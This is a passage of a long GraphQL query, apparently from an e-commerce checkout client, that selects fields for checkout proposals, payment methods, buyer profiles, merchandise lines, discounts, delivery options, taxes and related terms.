OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle 